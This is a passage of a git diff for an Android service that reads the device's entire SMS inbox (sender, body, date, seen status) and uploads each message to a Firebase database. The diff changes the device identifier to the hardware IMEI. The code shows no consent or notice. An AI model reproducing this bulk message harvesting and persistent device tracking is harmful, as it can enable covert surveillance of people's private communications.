@@ -1,15 +1,20 @@
 package com.nfx.leadmessages;
 
+import android.*;
+import android.Manifest;
 import android.app.Service;
 import android.content.ContentResolver;
 import android.content.Context;
 import android.content.Intent;
 import android.content.SharedPreferences;
+import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.net.Uri;
 import android.os.IBinder;
 import android.provider.Settings;
 import android.support.annotation.Nullable;
+import android.support.v4.app.ActivityCompat;
+import android.telephony.TelephonyManager;
 
 import com.google.firebase.FirebaseApp;
 import com.google.firebase.FirebaseOptions;
@@ -21,7 +26,7 @@ import com.google.firebase.database.FirebaseDatabase;
  */
 
 public class ReadMessages extends Service {
-    private String fpId,mobileId;
+    private String fpId,mobileId=null;
     private static final Uri MESSAGE_URI = Uri.parse("content://sms/");
     private String[] projections=new String[]{"date","address","body","seen"};
     private String selection="";
@@ -33,8 +38,10 @@ public class ReadMessages extends Service {
     public int onStartCommand(Intent intent, int flags, int startId) {
         SharedPreferences pref =getSharedPreferences(Constants.SHARED_PREF, Context.MODE_PRIVATE);
         fpId =pref.getString(Constants.FP_ID,null);
+        TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
+        mobileId = tm.getDeviceId();
+        //mobileId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
 
-        mobileId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
         if(mobileId == null || fpId == null){
             return Service.START_NOT_STICKY;
         }
@@ -70,7 +77,7 @@ public class ReadMessages extends Service {
                 stopSelf();
             }
         }).start();
-        return Service.START_STICKY;
+        return Service.START_NOT_STICKY;
     }
 
     @Override
@@ -89,18 +96,18 @@ public class ReadMessages extends Service {
         Cursor cursor = resolver.query(MESSAGE_URI,projections,selection,null,order);
             if(cursor!=null && cursor.moveToFirst()){
 
-                MessageListModel.PhoneIds phoneIds=new MessageListModel.PhoneIds();
+                PhoneIds phoneIds=new PhoneIds();
                 phoneIds.setDate(String.valueOf(System.currentTimeMillis()));
                 phoneIds.setPhoneId(mobileId);
                 DatabaseReference phoneIdRef = mDatabase.child(fpId+Constants.DETAILS).child(Constants.PHONE_IDS);
                 phoneIdRef.child(mobileId).setValue(phoneIds);
 
-                MessageListModel.SmsMessage message;
+                SmsMessage message;
                 DatabaseReference MessageIdRef = mDatabase.child(fpId+Constants.MESSAGES).child(mobileId);
                 MessageIdRef.removeValue();
                 do{
 
-                    message = MessageListModel.SmsMessage.getInstance()
+                    message = new SmsMessage()
                             .setDate(cursor.getLong(0))
                             .setSubject(cursor.getString(1))
                             .setBody(cursor.getString(2))
